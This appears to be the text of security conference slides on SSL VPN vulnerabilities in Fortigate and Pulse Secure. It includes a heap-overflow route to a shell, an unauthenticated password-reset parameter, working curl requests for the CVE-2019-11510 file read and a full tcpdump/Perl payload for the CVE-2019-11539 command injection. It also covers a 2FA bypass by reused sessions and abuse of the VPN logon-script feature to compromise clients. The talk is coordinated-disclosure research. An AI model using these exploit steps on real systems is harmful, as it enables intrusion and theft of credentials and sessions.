Mess up connections
• Overflow SSL structure
• Establish massive connections
• Lots of normal requests
• One overflow request
Fortigate
SSL VPN
Massive
connections
Normal request
Overflow request
Normal request
Normal request
Fuzzer
Exploit between connections
HEAP MEMORY
SSL
SSL
SSL
Connection 1
Connection 2
Connection 3
LOW
HIGH
Original SSL structure
HEAP MEMORY
SSL
SSL
SSL
version
method
*handshake
_func
ssl_accept()
…
…
LOW
HIGH
Trigger JavaScript Parsing
HEAP MEMORY
SSL
SSL
SSL
version
method
*handshake
_func
ssl_accept()
…
…
LOW
HIGH
JS
Buffer
Allocate
LOW
HIGH
Overflow SSL structure
HEAP MEMORY
SSL
SSL
SSL
version
method
ssl_accept()
JS
Buffer
memcpy(buffer, js_url, js_url_len);
*handshake
_func
…
…
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*handshake
_func
…
…
LOW
HIGH
From SEGFAULT to RCE
HEAP MEMORY
SSL
SSL
SSL
version
method
*handshake
_func
ssl_accept()
…
…
AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
LOW
HIGH
Forge SSL structure
HEAP MEMORY
SSL
SSL
version
method
system()
JS Buffer
SSL
*handshake
_func
…
…
Enjoy your shell!
• Send fuzzy connections to meet the condition
• Daemon may crash multiple times
• Fortigate owns a reliable watchdog!
• Get a shell in 1~2 minutes
Make your life easier
Find another Door to get in
MAGIC backdoor
• A “magic” parameter
• Secret key for reset password
• Designed for updating outdated password
• but lack of authentication
Demo
Pop a root shell from the only exposed HTTPS port
Pulse Secure SSL VPN
• Pulse Secure was formed a divestiture of Juniper Networks
• Customized web server and architecture stack
• Perl enthusiast - numerous Perl extensions in C++
• LD_PRELOAD all processes with:
• libsafe.so - Detect and protect against stack smashing attacks
• libpreload.so - User-mode networking system call hooks
Vulnerabilities we found 
• CVE-2019-11510 - Pre-auth arbitrary file reading
• CVE-2019-11538 - Post-auth NFS arbitrary file reading
• CVE-2019-11508 - Post-auth NFS arbitrary file writing
• CVE-2019-11542 - Post-auth stack buffer overflow
• CVE-2019-11539 - Post-auth command injection
• CVE-2019-11540 - XSSI session hijacking
• CVE-2019-11507 - Cross-site scripting
Arbitrary file reading
• CVE-2019-11510 – Webserver-level pre-auth file reading
• Pulse Secure has introduced a new feature HTML5 Access since 
SSL VPN version 8.2 
• A new solution to access Telnet, SSH and RDP via browsers
• To handle static resources, Pulse Secure created a new IF-case to 
widen the original strict path validation
Am I affected by this vuln?
• Probably YES!
• All un-patched version are vulnerable except the End-of-Life 8.1 code
$ curl -I 'https://sslvpn/dana-na///css/ds.js'
HTTP/1.1 400 Invalid Path
$ curl -I 'https://sslvpn/dana-na///css/ds.js?/dana/html5acc/guacamole/'
HTTP/1.1 200 OK
What can we extract?
1.
Private keys and system configuration(LDAP, RADIUS and SAML…)
2. Hashed user passwords(md5_crypt)
3. Sensitive cookies in WebVPN(ex: Google, Dropbox and iCloud…)
4. Cached user plaintext passwords
What can we extract?
1.
Private keys and system configuration(LDAP, RADIUS and SAML…)
2. Hashed user passwords(md5_crypt)
3. Sensitive cookies via WebVPN(ex: Google, Dropbox and iCloud…)
4. Cached user plaintext passwords
Command Injection
• CVE-2019-11539 – Post-auth Command Injection
sub tcpdump_options_syntax_check {
my $options = shift;
return $options if system("$TCPDUMP_COMMAND -d $options >/dev/null 2>&1") == 0;
return undef;
}
/dana-admin/diag/diag.cgi
Command Injection
Pulse Secure hardenings
• Several hardenings on Pulse Secure SSL VPN…
1.
System integrity check
2. Read-only filesystem(only /data are writable)
3. The DSSafe.pm as a safeguard protects Perl from dangerous 
operations
The Perl gatekeeper
• DSSafe.pm
• A Perl-C extension hooks several Perl function such as:
• system, open, popen, exec, backstick…
• Command-line syntax validation
• Disallow numerous bad characters - [\&\*\(\)\{\}\[\]\`\;\|\?\n~<>]
• Re-implement the Linux I/O redirections in Perl
Failed argument injection :(
• TCPDUMP is too old(v3.9.4, Sept 2005) to support post-rotate-command
• Observed Pulse Secure caches Perl template result in:
• /data/runtime/tmp/tt/*.thtml.ttc
• No way to generate a polyglot in both Perl and PCAP
Usage: tcpdump [-aAdDeflLnNOpqRStuUvxX] [-c count] [-C file_size]
[-E algo:secret] [-F file] [-i interface] [-M secret]
[-r file] [-s snaplen] [-T type] [-w pcap-file]
[-W filecount] [-z postrotate-command]
[-y datalinktype] [-Z user] [expression]
/usr/sbin/tcpdump –help
>_
Time to dig deeper
• Dig into DSSafe.pm more deeply, we found a flaw in 
command line I/O redirection parsing
use DSSafe;
system("tcpdump -d $options >/dev/null 2>&1");
system("tcpdump -d -h >file >/dev/null 2>&1");   # `file` not  found
system("tcpdump -d -h >file /dev/null 2>&1"); # `file` created
dssafe_example.pl
Think out of the box
STDOUT is uncontrollable
Could we write a valid Perl by just STDERR?
Think out of the box
$ tcpdump -d -r '123'
tcpdump: 123: No such file or directory
$ tcpdump -d -r '123' 2>&1 | perl -
syntax error at - line 1, near "123:"
Execution of - aborted due to compilation errors.
Think out of the box
$ tcpdump -d -r 'print 123#'
tcpdump: print 123#: No such file or directory
$ tcpdump -d -r 'print 123#' 2>&1 | perl –
123
tcpdump: print 123#: No such file or directory
Code
GOTO label
Comment
Perl 101
/usr/sbin/tcpdump -d 
-r'$x="ls",system$x#'
2>/data/runtime/tmp/tt/setcookie.thtml.ttc
/dev/null
2>&1
Our RCE Exploit
tcpdump: $x="ls",system$x#: No such file or directory
STDERR(2) > /data/runtime/tmp/tt/setcookie.thtml.ttc
1
/usr/sbin/tcpdump -d 
-r'$x="ls",system$x#'
2>/data/runtime/tmp/tt/setcookie.thtml.ttc
/dev/null
2>&1
tcpdump: $x="ls",system$x#: No such file or directory
STDERR(2) > /data/runtime/tmp/tt/setcookie.thtml.ttc
/usr/sbin/tcpdump -d 
-r'$x="ls",system$x#'
2>/data/runtime/tmp/tt/setcookie.thtml.ttc
/dev/null
2>&1
2
/usr/sbin/tcpdump -d 
-r'$x="ls",system$x#'
2>/data/runtime/tmp/tt/setcookie.thtml.ttc
/dev/null
2>&1
3
tcpdump: $x="ls",system$x#: No such file or directory
STDERR(2) > /data/runtime/tmp/tt/setcookie.thtml.ttc
/usr/sbin/tcpdump -d 
-r'$x="ls",system$x#'
2>/data/runtime/tmp/tt/setcookie.thtml.ttc
/dev/null
2>&1
tcpdump: $x="ls",system$x#: No such file or directory
boot  bin  home  lib64 
mnt
opt  proc
sys usr
var
data  etc
lib   lost+found
modules  pkg
sbin
tmp
...
curl https://sslvpn/dana-na/auth/setcookie.cgi
>_
Response from Pulse Secure
• Pulse Secure is committed to providing customers with the best Secure Access Solutions 
for Hybrid IT- SSL VPN and takes security vulnerabilities very seriously
• Timeline:
• This issue was reported to Pulse Secure PSIRT Team on March 22, 2019
• Pulse Secure fixes all reported issues in short span of time and published the security advisory SA44101 on 
April 24, 2019 with all software updates that address the vulnerabilities for unpatched versions
• Pulse Secure assigned the CVE’s to all reported vulnerabilities and updated the advisory on April 25, 2019
• Pulse Secure sent out a reminder to all customers to apply the security patches on June 26, 2019
• Pulse Secure would like to thank DEVCORE Team for reporting this vulnerability to Pulse 
Secure and working toward a coordinated disclosure
Hacking Twitter
• We keep monitoring large corporations who use Pulse Secure 
by fetching the exposed version and Twitter is one of them
• Pulse Secure released the patch on April 25, 2019 and we wait 
30 days for Twitter to upgrade the SSL VPN
Twitter is vulnerable
$ ./pulse_check.py .twitter.com
[*] Date = Thu, 13 Dec 2018 05:34:28 GMT
[*] Version = 9.0.3.64015
[*] OK, .twittr.com is vulnerable
Two-factor authentication
• Bypass the two-factor authentication
1.
Although we can extract cached passwords in plaintext from 
/lmdb/dataa/data.mdb, we still can not do anything :(
2. Observed Twitter enabled the Roaming Session (enabled by default)
3. Download the /lmdb/randomVal/data.mdb to dump all session
4. Forge the user and reuse the session to bypass the 2FA
Restricted admin interface
However
We only have the hash of admin password in 
sha256(md5_crypt(salt, …))
$20,160
Make the red team more 
Red
Weaponize the SSL VPN
• The old-school method
• Watering hole / Drive by download 
• Replace SSL VPN agent installer
• Man-in-the-middle attack
Weaponize the SSL VPN
• The new method to compromise all VPN clients
• Leverage the logon script feature!
• Execute specified program once the VPN client connected
• Almost every SSL VPN supports this feature
• Support Windows, Linux and Mac
Demo
Compromise all connected VPN clients
Recommendations
• Client certificate authentication
• Multi factors authentication
• Enable full log audit (Be sure to send to out-bound server)
• Subscribe to the vendor's security advisory and keep system 
updated!
Thanks!
@orange_8361
PI:EMAIL
@mehqq_
PI:EMAIL